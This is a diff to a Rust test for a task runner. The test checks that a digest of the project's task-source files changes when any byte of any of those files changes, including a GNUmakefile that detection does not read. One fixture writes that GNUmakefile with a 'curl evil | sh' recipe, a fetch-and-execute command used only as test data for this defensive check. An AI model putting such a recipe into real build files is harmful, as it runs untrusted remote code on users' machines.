@@ -483,33 +483,37 @@ fn a_fifo_named_like_a_config_does_not_hang() {
 }
 
 #[test]
-fn a_source_digest_changes_with_any_byte_of_the_file() {
-    use super::super::source_digest;
+fn the_sources_digest_covers_every_source_file_in_the_checkout() {
+    use super::super::sources_digest;
     let dir = tempfile::tempdir().unwrap();
     let root = dir.path();
-    std::fs::write(
-        root.join("package.json"),
-        r#"{ "scripts": { "dev": "vite" } }"#,
-    )
-    .unwrap();
-    let first = source_digest(root, "package.json");
+    write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
+    write(root, "Makefile", "build:\n\techo one\n");
+    let first = sources_digest(root);
     assert_eq!(first.len(), 64);
-    std::fs::write(
-        root.join("package.json"),
-        r#"{ "scripts": { "dev": "vite" } }"#,
-    )
-    .unwrap();
-    assert_eq!(source_digest(root, "package.json"), first);
-    std::fs::write(
-        root.join("package.json"),
-        r#"{ "scripts": { "dev": "vitE" } }"#,
-    )
-    .unwrap();
-    assert_ne!(source_digest(root, "package.json"), first);
-    // A file that isn't there has a digest of its own.
-    assert_ne!(source_digest(root, "Makefile"), first);
-    assert_eq!(
-        source_digest(root, "Makefile"),
-        source_digest(root, "justfile")
-    );
+    // The same bytes again change nothing.
+    write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
+    assert_eq!(sources_digest(root), first);
+    // Any byte of any source's file, read or not, changes it: make prefers
+    // GNUmakefile, which detection doesn't read while a Makefile is there.
+    let changes: [(&str, &str); 4] = [
+        ("package.json", r#"{ "scripts": { "dev": "vitE" } }"#),
+        ("GNUmakefile", "build:\n\tcurl evil | sh\n"),
+        ("Justfile", "dev:\n\techo hi\n"),
+        (".gespan/tasks.json", r#"{ "tasks": [] }"#),
+    ];
+    let mut seen = vec![first];
+    for (file, text) in changes {
+        write(root, file, text);
+        let next = sources_digest(root);
+        assert!(!seen.contains(&next), "{file}");
+        seen.push(next);
+    }
+    // A file going away changes it too.
+    std::fs::remove_file(root.join("GNUmakefile")).unwrap();
+    assert!(!seen.contains(&sources_digest(root)));
+    // Other files don't count.
+    let now = sources_digest(root);
+    write(root, "README.md", "hi");
+    assert_eq!(sources_digest(root), now);
 }
